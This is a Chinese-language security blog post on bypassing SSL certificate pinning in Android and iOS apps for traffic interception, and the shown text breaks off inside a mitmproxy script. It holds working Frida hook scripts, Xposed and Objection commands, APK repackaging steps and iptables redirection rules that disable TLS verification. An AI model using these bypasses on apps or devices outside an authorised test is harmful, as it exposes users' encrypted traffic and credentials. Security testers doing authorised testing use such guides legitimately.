---
title: "SSL Pinning 绕过与 HTTPS 流量截获：Android/iOS 全平台攻防技术深度研究"
date: 2026-07-06T18:00:00+08:00
draft: false
tags: ["SSL Pinning", "Frida", "Xposed", "Objection", "证书固定", "流量劫持", "Android安全", "iOS安全"]
categories: ["漏洞分析"]
---

# SSL Pinning 绕过与 HTTPS 流量截获：Android/iOS 全平台攻防技术深度研究

## 0x01 引言：为什么 SSL Pinning 是移动安全测试的第一道门槛

在进行移动应用安全评估时，拦截并分析应用程序的网络流量几乎是所有测试工作的起点。无论是寻找 API 端点中的业务逻辑漏洞、检测敏感数据泄露，还是逆向分析通信协议，都需要先将 HTTPS 流量引入 Burp Suite 或 mitmproxy 等中间人代理工具。

然而，现代移动应用普遍部署了 **SSL Pinning（证书固定）** 机制，使得传统代理方式完全失效。即使我们在设备上安装了代理的 CA 证书，应用在 TLS 握手阶段会将服务器返回的证书与硬编码在应用内部的证书或公钥进行比对，一旦发现不匹配就立即断开连接。这意味着：**仅仅是安装 CA 证书，远不足以完成流量劫持**。

本篇文章将从 SSL Pinning 的基本原理出发，系统性地覆盖以下内容：

- Certificate Pinning 与 Public Key Pinning 的技术区别
- Android 和 iOS 平台的各种 pinning 实现方式
- 从 Frida 通用脚本到 Xposed 模块、Objection 自动化绕过、Flutter/React Native 框架特定的 bypass 技巧
- 代理工具（Burp Suite、mitmproxy、BetterCap）的深度配置
- 运行时插桩绕过 Native 层 pinning 与 Certificate Transparency 等高阶技术
- 真实案例研究：银行 App、社交媒体 App 的流量劫持实战
- 检测与防御手段：RASP、反 Hook、证书锁定等

---

## 0x02 SSL Pinning 技术基础

### 2.1 标准 TLS 握手与信任模型

在标准的 HTTPS 通信中，客户端（移动应用）通过以下步骤验证服务器身份：

1. 客户端向服务器发起 TLS 握手请求
2. 服务器返回其 SSL 证书（包含公钥、颁发者、有效期等信息）
3. 客户端检查该证书是否由设备信任的证书颁发机构（CA）签署
4. 如果证书链可追溯至受信任的根 CA，则连接建立成功

攻击者只要将自签名 CA 证书安装到设备的信任存储中，就可以使用 Burp Suite 等代理工具为任意域名签发证书，从而实现对流量的中间人劫持。

### 2.2 SSL Pinning 的核心原理

SSL Pinning 在上述标准流程的基础上增加了一层额外的验证：**应用在编译时将预期的服务端证书或公钥硬编码到自身中，在运行时将服务器实际返回的证书与硬编码的值进行比对**。

#### Certificate Pinning（证书固定）

应用直接存储服务器的完整证书文件（通常是 .cer 或 .pem 格式），在 TLS 握手完成后，将服务器证书与本地存储的证书进行字节级比对。

```java
// Android 端 Certificate Pinning 示例 - OkHttp
CertificatePinner certificatePinner = new CertificatePinner.Builder()
    .add("api.example.com", "sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=")
    .build();

OkHttpClient client = new OkHttpClient.Builder()
    .certificatePinner(certificatePinner)
    .build();
```

#### Public Key Pinning（公钥固定）

应用只存储服务器证书的公钥或其 SHA-256 哈希值。这种方法比证书固定更灵活，因为当证书续期时，只要公钥不变就无需更新应用。

#### SPKI Pinning

对 Subject Public Key Info（SPKI）进行哈希处理，这是 OWASP 推荐的方式，因为它提取的是证书中最稳定的部分。

### 2.3 两种 Pinning 方式的比较

| 特性 | Certificate Pinning | Public Key Pinning |
|------|---------------------|-------------------|
| 更新频率 | 证书到期后必须更新 App | 公钥不变则无需更新 |
| 安全性 | 字节级对比，精确但脆弱 | 仅对比公钥，略有弹性 |
| 实现复杂度 | 简单 | 中等 |
| 推荐度 | 低 | 高（OWASP 推荐） |

---

## 0x03 Android 平台 SSL Pinning 实现方式

### 3.1 Network Security Config（Android 7+ 官方方式）

Android 7.0（API 24）引入了 Network Security Config 机制，允许开发者通过 XML 配置文件声明式地定义证书固定策略。

```xml
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <domain-config>
        <domain includeSubdomains="true">example.com</domain>
        <pin-set expiration="2026-12-31">
            <pin digest="SHA-256">7HIpactkIAq2Y49orFOOQeD4M5jDg5V0iJfE1QhKd4o=</pin>
            <!-- 备份 pin -->
            <pin digest="SHA-256">RwG35gE5eB1hYqM2WxNzfF3gA7sD9jK4lV0pQ8rTc6s=</pin>
        </pin-set>
    </domain-config>
</network-security-config>
```

在 AndroidManifest.xml 中引用该配置：

```xml
<application
    android:networkSecurityConfig="@xml/network_security_config"
    ...>
```

**关键绕过点**：如果设备已 root，攻击者可以直接修改 `res/xml/network_security_config.xml` 文件，删除 pin-set 配置，然后重新打包签名应用。

### 3.2 TrustManager 自定义（Java/Kotlin 层）

开发者可以通过实现自定义的 X509TrustManager 来绕过系统默认的证书验证逻辑。

```java
// 自定义 TrustManager - 这是安全测试中最常 hook 的目标
TrustManager[] trustAllCerts = new TrustManager[]{
    new X509TrustManager() {
        @Override
        public void checkClientTrusted(X509Certificate[] chain, String authType) {}
        
        @Override
        public void checkServerTrusted(X509Certificate[] chain, String authType) {}
        
        @Override
        public X509Certificate[] getAcceptedIssuers() {
            return new X509Certificate[0];
        }
    }
};

SSLContext sc = SSLContext.getInstance("TLS");
sc.init(null, trustAllCerts, new SecureRandom());
HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
```

### 3.3 OkHttp / Retrofit 的 CertificatePinner

OkHttp 是 Android 平台最流行的 HTTP 客户端库，它提供了内置的 CertificatePinner 类：

```java
OkHttpClient client = new OkHttpClient.Builder()
    .certificatePinner(
        new CertificatePinner.Builder()
            .add("api.example.com", "sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=")
            .build()
    )
    .build();
```

**Frida Hook 点**：`okhttp3.CertificatePinner.check()` 方法是 OkHttp 3.x 中的核心验证函数。

### 3.4 WebView 的证书处理

Android WebView 使用系统的默认信任链，但如果应用对 WebView 中的连接进行了自定义证书校验，则需要单独处理：

```java
WebViewClient webViewClient = new WebViewClient() {
    @Override
    public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
        // 某些应用可能直接调用 handler.proceed() 忽略错误
        // 或者进行自定义的证书校验
        handler.proceed(); // 跳过 SSL 错误
    }
};
```

---

## 0x04 iOS 平台 SSL Pinning 实现方式

### 4.1 App Transport Security（ATS）

iOS 9 引入的 ATS 是 Apple 强制推行的安全策略，要求所有网络连接使用 HTTPS：

```xml
<key>NSAppTransportSecurity</key>
<dict>
    <key>NSExceptionDomains</key>
    <dict>
        <key>example.com</key>
        <dict>
            <key>NSIncludesSubdomains</key>
            <true/>
            <key>NSTemporaryExceptionAllowsInsecureHTTPLoads</key>
            <false/>
        </dict>
    </dict>
</dict>
```

**绕过方式**：在越狱设备上，可以通过修改 Info.plist 将 `NSAllowsArbitraryLoads` 设为 `true`。

### 4.2 NSURLAuthenticationChallenge / URLSession Delegate

iOS 开发中最常用的 pinning 方式是通过 URLSession 的 delegate 方法：

```swift
func urlSession(_ session: URLSession, 
                didReceive challenge: URLAuthenticationChallenge,
                completionHandler: @escaping (URLSession.AuthChallengeDisposition, URLCredential?) -> Void) {
    
    guard let serverTrust = challenge.protectionSpace.serverTrust else {
        completionHandler(.cancelAuthenticationChallenge, nil)
        return
    }
    
    // 获取服务器证书
    if let serverCertificate = SecTrustGetCertificateAtIndex(serverTrust, 0) {
        let serverCertData = SecCertificateCopyData(serverCertificate) as Data
        // 与本地硬编码的证书数据比较
        if serverCertData == pinnedCertData {
            completionHandler(.useCredential, URLCredential(trust: serverTrust))
        } else {
            completionHandler(.cancelAuthenticationChallenge, nil)
        }
    }
}
```

### 4.3 TrustKit 库

TrustKit 是 iOS 上最流行的第三方 SSL pinning 库，提供了声明式的配置方式：

```objc
[TrustKit initSharedInstanceWithConfiguration:@{
    kTSKSwizzleNetworkDelegates: @YES,
    kTSKPinnedDomains: @{
        @"api.example.com": @{
            kTSKEnforcePinning: @YES,
            kTSKPublicKeyHashes: @[
                @"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
                @"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB=",
            ],
        },
    },
}];
```

**Frida Hook 点**：`-[TSKPinningValidator evaluateTrust:forHostname:]`

### 4.4 Alamofire 框架的 Pinning

Alamofire 是 Swift 生态中最流行的网络库，它提供了 ServerTrustManager 和 ServerTrustPolicy 来实现 pinning。

---

## 0x05 环境搭建：从零构建移动安全测试实验室

### 5.1 Android 测试环境

#### 必备工具清单

- 一台已解锁 Bootloader 并 Root 的 Android 设备（推荐 Pixel 系列或 OnePlus）
- Magisk（系统级 Root 方案）
- ADB（Android Debug Bridge）
- Frida + Frida-Tools
- Burp Suite 或 mitmproxy

#### Frida Server 部署步骤

```bash
# 检查设备架构
adb shell getprop ro.product.cpu.abi

# 下载对应架构的 Frida Server
wget https://github.com/frida/frida/releases/download/16.5.9/frida-server-16.5.9-android-arm64.xz
xz -d frida-server-16.5.9-android-arm64.xz

# 推送到设备
adb push frida-server-16.5.9-android-arm64 /data/local/tmp/frida-server
adb shell chmod 755 /data/local/tmp/frida-server

# 启动 Frida Server
adb shell su -c "/data/local/tmp/frida-server &"

# 验证连接
frida-ps -U
```

#### 代理配置

```bash
# 通过 iptables 将所有流量转发到 Burp Suite（透明代理模式）
adb shell su -c "iptables -t nat -A OUTPUT -p tcp --dport 80 -j REDIRECT --to-port 8080"
adb shell su -c "iptables -t nat -A OUTPUT -p tcp --dport 443 -j REDIRECT --to-port 8080"

# 如果应用不遵守系统代理，可以使用 ProxyDroid（需 Root）
# ProxyDroid 通过 iptables 强制转发所有 TCP 流量到指定代理
```

### 5.2 iOS 测试环境

#### 必备工具清单

- 一台已越狱的 iOS 设备（推荐 iPhone 6s~iPhone X，支持 checkra1n / Dopamine）
- Frida（通过 Cydia/Sileo 从 build.frida.re 源安装）
- OpenSSH + iproxy（USB 通道 SSH）
- Burp Suite 或 mitmproxy

#### Frida 安装与验证

```bash
# 在 Cydia 中添加源
# https://build.frida.re
# 搜索并安装 Frida

# 主机端安装
pip3 install frida-tools objection

# 验证连接（通过 USB）
frida-ps -U -ai

# USB 端口转发
iproxy 2222 22

# SSH 连接
ssh -p 2222 root@127.0.0.1
# 默认密码: alpine
```

#### iOS 代理配置

由于 iOS 不允许修改系统级代理设置，常见的做法是：
1. 在 Wi-Fi 设置中配置 HTTP 代理
2. 使用 VPN 方式（如 ProxyDroid for iOS 或 mitmproxy 的透明代理模式）
3. 使用越狱插件如 **Shadow** 或 **Potatso** 强制代理

---

## 0x06 Frida 通用 SSL Pinning Bypass 脚本深度解析

### 6.1 通用 Bypass 脚本架构

一个完善的 Android 通用 SSL Pinning Bypass 脚本需要覆盖以下 hook 点：

1. **TrustManagerImpl**（Android 7+，Conscrypt 安全提供者）
2. **X509TrustManager**（Android 6 及以下）
3. **SSLContext.init()**（所有版本）
4. **OkHttp CertificatePinner**（v3.x）
5. **WebView 证书校验**（onReceivedSslError）
6. **Appcelerator Titanium**（特定框架）
7. **动态异常捕获**（针对 SSLPeerUnverifiedException）

### 6.2 逐层解析：完整 Bypass 脚本

```javascript
// frida-android-universal-unpinning.js
setTimeout(function() {
    Java.perform(function() {
        console.log("[*] Starting universal SSL pinning bypass...");

        // === Layer 1: Android 7+ TrustManagerImpl ===
        try {
            var TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');
            TrustManagerImpl.verifyChain.implementation = function(
                untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData) {
                console.log("[+] TrustManagerImpl.verifyChain() called for: " + host);
                return untrustedChain;
            };
            console.log("[+] Layer 1: TrustManagerImpl hooked (Android 7+)");
        } catch(e) { console.log("[-] Layer 1 not found"); }

        // === Layer 2: Custom X509TrustManager（Android < 7）===
        var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
        var SSLContext = Java.use('javax.net.ssl.SSLContext');

        // 注册一个空的 TrustManager
        var EmptyTrustManager = Java.registerClass({
            name: 'com.x7peeps.EmptyTrustManager',
            implements: [X509TrustManager],
            methods: {
                checkClientTrusted: function(chain, authType) {},
                checkServerTrusted: function(chain, authType) {},
                getAcceptedIssuers: function() { return []; }
            }
        });

        var trustManagers = [EmptyTrustManager.$new()];
        var SSLContext_init = SSLContext.init.overload(
            '[Ljavax.net.ssl.KeyManager;', 
            '[Ljavax.net.ssl.TrustManager;', 
            'java.security.SecureRandom'
        );

        SSLContext_init.implementation = function(keyManager, trustManager, secureRandom) {
            console.log("[+] SSLContext.init() intercepted - replacing with empty TrustManager");
            SSLContext_init.call(this, keyManager, trustManagers, secureRandom);
        };
        console.log("[+] Layer 2: SSLContext.init() hooked");

        // === Layer 3: OkHttp CertificatePinner ===
        try {
            var CertificatePinner = Java.use('okhttp3.CertificatePinner');
            CertificatePinner.check.overload('java.lang.String', 'java.util.List')
                .implementation = function(host, list) {
                console.log("[+] OkHttp CertificatePinner.check() bypassed for: " + host);
            };
            console.log("[+] Layer 3: OkHttp CertificatePinner hooked");
        } catch(e) { console.log("[-] Layer 3: OkHttp not found"); }

        // === Layer 4: WebView SSL Error 处理 ===
        try {
            var WebViewClient = Java.use('android.webkit.WebViewClient');
            WebViewClient.onReceivedSslError.implementation = function(view, handler, error) {
                console.log("[+] WebView SSL error bypassed: " + error.getPrimaryError());
                handler.proceed();
            };
            console.log("[+] Layer 4: WebView SSL error handler hooked");
        } catch(e) { console.log("[-] Layer 4: WebView not found"); }

        // === Layer 5: 动态 SSLPeerUnverifiedException 捕获 ===
        try {
            var SSLPeerUnverifiedException = Java.use('javax.net.ssl.SSLPeerUnverifiedException');
            SSLPeerUnverifiedException.$init.implementation = function(str) {
                console.log("[+] SSLPeerUnverifiedException blocked: " + str);
                return;
            };
            console.log("[+] Layer 5: Dynamic exception handler installed");
        } catch(e) { console.log("[-] Layer 5: Exception handler failed"); }

        console.log("[*] All pinning bypass layers deployed successfully");
    });
}, 0);
```

### 6.3 Re-Pinning 方法（替换 CA 而非完全禁用）

另一种方法不是完全禁用证书校验，而是将 Burp Suite 的 CA 证书注入到应用的信任链中：

```javascript
// frida-repinning.js - 替换 CA 证书
Java.perform(function() {
    var CertificateFactory = Java.use("java.security.cert.CertificateFactory");
    var FileInputStream = Java.use("java.io.FileInputStream");
    var BufferedInputStream = Java.use("java.io.BufferedInputStream");
    var X509Certificate = Java.use("java.security.cert.X509Certificate");
    var KeyStore = Java.use("java.security.KeyStore");
    var TrustManagerFactory = Java.use("javax.net.ssl.TrustManagerFactory");
    var SSLContext = Java.use("javax.net.ssl.SSLContext");

    // 加载 Burp Suite CA 证书
    var cf = CertificateFactory.getInstance("X.509");
    var fileInputStream = FileInputStream.$new("/data/local/tmp/cert-der.crt");
    var bufferedInputStream = BufferedInputStream.$new(fileInputStream);
    var ca = cf.generateCertificate(bufferedInputStream);
    bufferedInputStream.close();

    var certInfo = Java.cast(ca, X509Certificate);
    console.log("[+] Loaded Burp CA: " + certInfo.getSubjectDN());

    // 创建包含 Burp CA 的 KeyStore
    var keyStoreType = KeyStore.getDefaultType();
    var keyStore = KeyStore.getInstance(keyStoreType);
    keyStore.load(null, null);
    keyStore.setCertificateEntry("burp-ca", ca);

    // 创建 TrustManager
    var tmfAlgorithm = TrustManagerFactory.getDefaultAlgorithm();
    var tmf = TrustManagerFactory.getInstance(tmfAlgorithm);
    tmf.init(keyStore);

    // Hook SSLContext.init() 替换 TrustManager
    SSLContext.init.overload(
        "[Ljavax.net.ssl.KeyManager;", 
        "[Ljavax.net.ssl.TrustManager;", 
        "java.security.SecureRandom"
    ).implementation = function(a, b, c) {
        console.log("[+] SSLContext.init() patched with Burp CA TrustManager");
        this.init(a, tmf.getTrustManagers(), c);
    };
});
```

### 6.4 使用方式

```bash
# 方法一：通过 codeshare 直接使用
frida --codeshare masbog/frida-android-unpinning-ssl -f com.target.app -U --no-pause

# 方法二：使用本地脚本
frida -U -f com.target.app -l frida-android-universal-unpinning.js --no-pause

# 方法三：通过 Objection 加载脚本
objection --gadget com.target.app explore
# 在 objection 控制台中：
# import frida-android-universal-unpinning.js
# android sslpinning disable
```

---

## 0x07 Xposed / LSPosed 模块绕过 SSL Pinning

### 7.1 Xposed 框架原理

Xposed 框架通过替换 Android 系统的 `app_process` 进程，在 Zygote 启动时加载自定义模块，从而实现对任意应用的 Java 方法进行 Hook。与 Frida 的运行时注入不同，Xposed 的 Hook 是 **持久化** 的——一旦安装并启用模块，重启设备后仍然生效。

### 7.2 JustTrustMe

JustTrustMe 是 Xposed 上最经典的 SSL Pinning bypass 模块，由 Fuzion24 开发。它的工作原理是 Hook 所有与证书校验相关的 Java 方法：

```java
// JustTrustMe 核心逻辑伪代码
// Hook X509TrustManager.checkServerTrusted()
findAndHookMethod("javax.net.ssl.X509TrustManager", lpparam.classLoader,
    "checkServerTrusted", X509Certificate[].class, String.class,
    new XC_MethodHook() {
        @Override
        protected void beforeHookedMethod(MethodHookParam param) {
            // 什么也不做——直接跳过证书校验
        }
    }
);

// Hook SSLContext.init()
findAndHookMethod("javax.net.ssl.SSLContext", lpparam.classLoader,
    "init", KeyManager[].class, TrustManager[].class, SecureRandom.class,
    new XC_MethodHook() {
        @Override
        protected void beforeHookedMethod(MethodHookParam param) {
            // 替换 TrustManager 为空的 TrustManager
            TrustManager[] emptyTM = new TrustManager[] { emptyTrustManager };
            param.args[1] = emptyTM;
        }
    }
);
```

### 7.3 SSLUnpinning Xposed 模块

SSLUnpinning 是一个功能更加完善的 Xposed 模块，它不仅 hook 了标准的 TrustManager，还额外覆盖了 OkHttp 3.x 的 CertificatePinner：

```java
// SSLUnpinning 中对 OkHttp 的 hook
findAndHookMethod("okhttp3.CertificatePinner", lpparam.classLoader,
    "check", String.class, List.class,
    new XC_MethodHook() {
        @Override
        protected void beforeHookedMethod(MethodHookParam param) {
            param.setResult(null); // 返回 null，跳过 pinning 检查
        }
    }
);
```

### 7.4 LSPosed 模块

LSPosed 是 Xposed 在 Android 8+（尤其是 Android 12/13/14）上的现代替代品，它基于 Magisk 和 Riru/Zygisk 框架，提供了更好的兼容性和稳定性。

**TrustMeAlready** 是 LSPosed 上的活跃维护的 SSL bypass 模块，支持 Android 14：

```bash
# 安装步骤
1. 通过 Magisk 安装 Zygisk-LSPosed
2. 下载 TrustMeAlready APK
3. 在 LSPosed 管理器中启用模块
4. 选择目标应用
5. 重启目标应用
```

### 7.5 Xposed vs Frida 对比

| 特性 | Xposed / LSPosed | Frida |
|------|-----------------|-------|
| 持久化 | 是（重启后仍生效） | 否（每次需要重新注入） |
| Root 需求 | 必需 | Server 模式需要 Root；Gadget 模式不需要 |
| Hook 时机 | Zygote 启动时 | 应用运行时 |
| Native Hook | 不支持 | 支持（Interceptor API） |
| 隐蔽性 | 较差（容易检测） | 相对较好 |
| 使用便捷性 | 安装即用 | 需要命令行操作 |
| 跨平台 | 仅 Android | Android / iOS / Windows / macOS |

---

## 0x08 Objection 自动化绕过框架

### 8.1 Objection 简介

Objection 是由 SensePost 开发的运行时移动探索工具，基于 Frida 构建。它提供了大量预构建的绕过脚本，包括 SSL pinning bypass、root/jailbreak 检测绕过、调试器检测绕过等。

### 8.2 Android SSL Pinning Bypass

```bash
# 启动 Objection 并附加到目标应用
objection --gadget com.target.app explore

# 在 Objection 控制台中执行
android sslpinning disable
```

Objection 实际上自动执行了以下操作：
1. 检测应用是否使用了 OkHttp
2. Hook OkHttp 的 CertificatePinner
3. Hook 系统的 TrustManagerImpl（适用于 Android 7+）
4. Hook 自定义的 X509TrustManager
5. 注册空的 TrustManager

### 8.3 iOS SSL Pinning Bypass

```bash
# 启动 Objection
objection --gadget com.target.app explore

# 执行 iOS pinning bypass
ios sslpinning disable
```

Objection for iOS 会 Hook：
- TrustKit 的 `evaluateTrust:forHostname:`
- NSURLSession 的 `didReceiveChallenge` 回调
- AFNetworking 的证书校验方法
- Alamofire 的 ServerTrustManager

### 8.4 绕过混淆应用的思路

当应用使用了 ProGuard 或其他混淆工具时，OkHttp 的类名会被混淆（如 `a.b.c`），Objection 无法通过类名找到目标。此时需要通过 Frida 手动寻找：

```javascript
// 在混淆应用中定位 OkHttp CertificatePinner
Java.enumerateLoadedClasses({
    onMatch: function(className) {
        if (className.toLowerCase().indexOf("certificatepinner") !== -1 ||
            className.toLowerCase().indexOf("check") !== -1) {
            console.log("Found: " + className);
        }
    },
    onComplete: function() {}
});
```

更精确的方法：Hook `CertificatePinner.Builder.add()` 方法，因为即使在混淆后，该方法的签名和参数类型仍然唯一：

```javascript
// 通过 Builder.add() 定位混淆后的 CertificatePinner
var CertificatePinner = Java.use('okhttp3.CertificatePinner');
// 枚举所有重载的 add 方法
var addMethods = CertificatePinner.add.overloads;
addMethods.forEach(function(method) {
    console.log("Overload: " + method);
});

// 如果 add 方法被混淆导致无法直接定位，可以从 Builder 入手
var classes = Java.enumerateLoadedClassesSync();
classes.forEach(function(className) {
    if (className.includes("CertificatePinner$Builder")) {
        console.log("Found Builder: " + className);
        var builderClass = Java.use(className);
        builderClass.add.implementation = function(host, pins) {
            console.log("[+] Builder.add() called: " + host);
            return this.add(host, pins);
        };
    }
});
```

---

## 0x09 Android 特定框架 SSL Pinning Bypass

### 9.1 Flutter SSL Pinning Bypass

Flutter 应用使用 Dart 语言的 `dart:io` 库进行网络通信，最终在底层调用 BoringSSL（Google 的 OpenSSL 分支）进行 TLS 握手。由于网络栈在 Native 层实现，传统的 Java Hook 方法完全无效。

#### Flutter 流量劫持的挑战

1. Flutter 不遵守系统代理设置（HTTP_PROXY 等环境变量仅在 Dart VM 启动时读取，Android 应用不继承）
2. SSL 证书校验在 Native 层（libflutter.so）完成
3. 不同 Flutter 版本中关键函数偏移量不同

#### 方法一：reFlutter 静态重打包

reFlutter 是一个自动化的 Flutter 应用逆向工程框架：

```bash
# 安装 reFlutter
pip3 install reflutter

# 使用 reFlutter 打补丁
reflutter main.apk
# 输入 Burp Suite IP 地址
# 生成 patched APK: release.RE.apk

# 签名并安装
java -jar uber-apk-signer.jar --allowResign -a release.RE.apk
adb install release.RE.apk
```

reFlutter 的原理是替换 `libflutter.so` 中证书验证函数的实现，使其始终返回成功。

#### 方法二：Frida Hook BoringSSL 函数

针对 Flutter 的 Frida bypass 脚本可以 Hook BoringSSL 的关键函数：

```javascript
// disable-flutter-tls.js
var sslVerifyPtr = Module.findExportByName(
    "libflutter.so", 
    "ssl_crypto_x509_session_verify_cert_chain"
);

if (sslVerifyPtr) {
    Interceptor.attach(sslVerifyPtr, {
        onLeave: function(retval) {
            console.log("[+] BoringSSL verify_cert_chain overridden");
            retval.replace(1); // 始终返回 1（成功）
        }
    });
}

// 对于新版本 Flutter，函数名可能已变化
var altFuncs = [
    "SSL_verify_cert_chain",
    "ssl_verify_peer_cert",
    "X509_verify_cert_error_string"
];

altFuncs.forEach(function(funcName) {
    var addr = Module.findExportByName("libflutter.so", funcName);
    if (addr) {
        console.log("[+] Found: " + funcName + " at " + addr);
        Interceptor.attach(addr, {
            onLeave: function(retval) {
                retval.replace(1);
            }
        });
    }
});
```

#### 方法三：Dio 包证书固定绕过

如果 Flutter 应用使用了 Dio 包进行 HTTP 通信并实现了证书固定，可以 Hook `SecurityContext` 类。

#### 方法四：Hotspot 透明代理法

对于无法直接 hook 的 Flutter 应用，可以使用物理层面的流量转发：

```bash
# macOS 上创建 pf 规则将 iOS 设备流量转发到代理
echo "rdr pass on bridge100 inet proto tcp from any to any -> 127.0.0.1 port 8080" > pf.rules
sudo pfctl -f pf.rules
sudo sysctl -w net.inet.ip.forwarding=1
```

### 9.2 React Native SSL Pinning Bypass

React Native 应用的证书固定通常通过 `react-native-ssl-pinning` 包实现。

#### Frida 通用脚本绕过

大部分 React Native 应用使用 OkHttp（Android）或 NSURLSession（iOS）进行网络通信，因此标准的 Frida 通用脚本通常能直接生效。

#### 静态替换证书文件

React Native 应用的证书文件通常存储在 APK 的 `assets` 目录中：

```bash
# 步骤 1：解压 APK
apktool d target.apk -o target_decoded

# 步骤 2：在 assets 目录中找到 .cer 或 .pem 文件
ls target_decoded/assets/*.cer

# 步骤 3：将 Burp Suite 的 CA 证书重命名并替换
cp burp-ca.der target_decoded/assets/原来的证书文件名.cer

# 步骤 4：重新打包并签名
apktool b target_decoded -o target_patched.apk
jarsigner -keystore my.keystore target_patched.apk alias
adb install target_patched.apk
```

### 9.3 WebView 证书处理绕过

对于在 WebView 中加载 HTTPS 内容的应用，可以 Hook `WebViewClient.onReceivedSslError`：

```javascript
Java.perform(function() {
    var WebViewClient = Java.use('android.webkit.WebViewClient');
    WebViewClient.onReceivedSslError.overload(
        'android.webkit.WebView', 
        'android.webkit.SslErrorHandler', 
        'android.net.http.SslError'
    ).implementation = function(view, handler, error) {
        console.log("[+] WebView SSL Error: " + error.getUrl());
        handler.proceed(); // 绕过 SSL 错误
    };
});
```

---

## 0x0A iOS 平台特定绕过技术

### 10.1 SSL Kill Switch 2

SSL Kill Switch 2 是 iOS 越狱社区中最经典的 SSL Pinning bypass 工具之一。它是一个 Cydia 插件，通过 MobileSubstrate 在系统底层 Patch SecureTransport 和 NSURLSession 的 API：

```bash
# 通过 Cydia 安装 SSL Kill Switch 2
# 源: https://github.com/nabla-c0d3/ssl-kill-switch2

# 安装后在设置中启用
# 设置 -> SSL Kill Switch 2 -> Enable
```

它的工作原理是：
1. Hook `SecTrustEvaluate()` 和 `SecTrustEvaluateWithError()` 
2. Hook `NSURLSession` 的 TLS 回调
3. 使所有系统级的证书校验全部返回成功

### 10.2 Frida iOS Bypass 脚本（支持 iOS 17+）

针对较新的 iOS 版本（17.x），需要覆盖更多的 hook 点：

```javascript
// ios-ssl-pinning-bypass.js
if (ObjC.available) {
    // === Hook 1: Security Framework ===
    var SecTrustEvaluate = Module.findExportByName(
        "Security", "SecTrustEvaluate"
    );
    Interceptor.replace(SecTrustEvaluate, 
        new NativeCallback(function(trust, result) {
            if (result && !result.isNull()) {
                result.writeU32(1); // kSecTrustResultProceed
            }
            return 0; // errSecSuccess
        }, 'int', ['pointer', 'pointer'])
    );

    // === Hook 2: SecTrustEvaluateWithError (iOS 12+) ===
    var SecTrustEvaluateWithError = Module.findExportByName(
        "Security", "SecTrustEvaluateWithError"
    );
    Interceptor.replace(SecTrustEvaluateWithError,
        new NativeCallback(function(trust, error) {
            if (error && !error.isNull()) {
                error.writePointer(ptr("0x0")); // NULL out error
            }
            return 1; // true = success
        }, 'bool', ['pointer', 'pointer'])
    );

    // === Hook 3: BoringSSL Custom Verify ===
    var SSL_CTX_set_custom_verify = Module.findExportByName(
        "libboringssl.dylib", "SSL_CTX_set_custom_verify"
    );
    if (SSL_CTX_set_custom_verify) {
        var noopVerify = new NativeCallback(
            function(ssl, out_alert) { return 0; }, // X509_V_OK
            'int', ['pointer', 'pointer']
        );
        Interceptor.attach(SSL_CTX_set_custom_verify, {
            onEnter: function(args) {
                args[2] = noopVerify; // 替换回调为无操作
            }
        });
    }

    // === Hook 4: TrustKit ===
    try {
        var TSKPinningValidator = ObjC.classes.TSKPinningValidator;
        if (TSKPinningValidator) {
            ObjC.schedule(ObjC.mainQueue, function() {
                var method = TSKPinningValidator['- evaluateTrust:forHostname:'];
                if (method) {
                    method.implementation = function(self, sel, trust, hostname) {
                        console.log("[+] TrustKit bypassed for: " + hostname);
                        return true;
                    };
                }
            });
        }
    } catch(e) {
        console.log("[-] TrustKit not found");
    }

    console.log("[+] iOS SSL Pinning bypass hooks deployed");
}
```

### 10.3 Frida-Gadget 注入（无越狱设备）

对于无法越狱的 iOS 设备，可以通过 Frida-Gadget 模式实现 SSL Pinning bypass：

```bash
# 步骤 1：将 Frida-Gadget 注入 IPA
objection patchipa --source target.ipa --codesign-signature "Apple Development: xxx"

# 步骤 2：安装 patched IPA
# 使用 iOS App Signer 重签名后通过 Xcode 或 AltStore 安装

# 步骤 3：连接 Frida
frida -H 192.168.1.100 -f com.target.app
```

### 10.4 iOS 越狱检测绕过

许多 iOS 应用同时部署了越狱检测和 SSL Pinning，需要先绕过越狱检测才能进行 pinning bypass：

```bash
# Objection 中同时绕过越狱检测和 SSL Pinning
objection --gadget com.target.app explore \
    --startup-command "ios jailbreak disable" \
    --startup-command "ios sslpinning disable"
```

常用的 iOS 越狱检测绕过点：
- `-[NSFileManager fileExistsAtPath:]`（检查越狱文件）
- `stat()` 或 `access()`（检查 /bin/bash、/var/lib/apt 等）
- `fork()` 或 `system()`（测试进程创建能力）

---

## 0x0B 代理工具深度配置

### 11.1 Burp Suite 高级配置

#### 不可见代理模式

当应用使用 HTTP 客户端库（如 OkHttp、Flutter 的 dart:io）时，需要在 Burp Suite 中启用不可见代理：

```
Proxy -> Options -> Proxy Listeners
  -> Edit -> Request Handling
    -> Support Invisible Proxying (enable)
```

#### Burp Suite + iptables 透明代理

对于 Android 设备，可以通过 iptables 实现透明代理，绕过应用对系统代理设置的忽略：

```bash
# 启用 IP 转发
adb shell su -c "sysctl -w net.ipv4.ip_forward=1"

# 将所有 80 和 443 流量重定向到 Burp Suite
adb shell su -c "iptables -t nat -A OUTPUT -p tcp --dport 80 -j DNAT --to-destination BURP_IP:8080"
adb shell su -c "iptables -t nat -A OUTPUT -p tcp --dport 443 -j DNAT --to-destination BURP_IP:8080"

# 排除 Burp Suite 自己的流量（防止循环）
adb shell su -c "iptables -t nat -A OUTPUT -p tcp -d BURP_IP --dport 8080 -j RETURN"
```

### 11.2 mitmproxy 脚本编写

mitmproxy 提供了强大的 Python 脚本扩展能力，可以编写自定义的请求/响应处理逻辑：

```python
# mitmproxy_ssl_bypass.py
from mitmproxy import http, tls
import logging

class SSLUnpinInspector:
    def __init__(self):
        self.intercepted_hosts = set()
    
    def tls_clienthello(self, data: tls.ClientHelloData):
        """记录所有 TLS ClientHello 中的 SNI 信息"""
        if data.client_hello.sni:
            self.intercepted_hosts.add(data.client_hello.sni)
